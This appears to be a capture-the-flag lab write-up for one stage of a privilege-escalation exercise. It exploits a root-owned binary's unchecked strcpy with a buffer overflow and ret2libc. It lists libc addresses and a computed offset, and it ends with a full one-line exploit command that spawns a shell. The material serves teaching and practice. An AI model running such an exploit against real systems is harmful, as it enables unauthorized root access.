PHASE 4 ZAZ SSH

In zaz home, there is a file named exploit_me (owned by root) and a dir named mail.
We will focus on exploiting the binary.
In gdb, we see that the binary uses strcpy to copy our input into an unprotected buffer.
We will do a buffer overflow followed by a ret2libc attack.
Address of system:      0xb7e6b060
Address of exit:        0xb7e5ebe0
Adress of "/bin/sh":    0xb7f8cc58
ESP:                    0xbffff6b0
EIP:                    0xbffff73c
To find length of buffer that strcpy copies the input to, we simply do:
ADDRESS OF EIP - ADDRESS OF ESP
0xbffff73c - 0xbffff6b0 = 140
Len of buffer is 140.
For our attack to be successfull, we need to overwrite EIP's address with the one of system, then we need to write the address of exit and finally the address of "/bin/sh".
Our attack will have the following form:
./exploit_me $(python -c 'print "a"*140 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"')
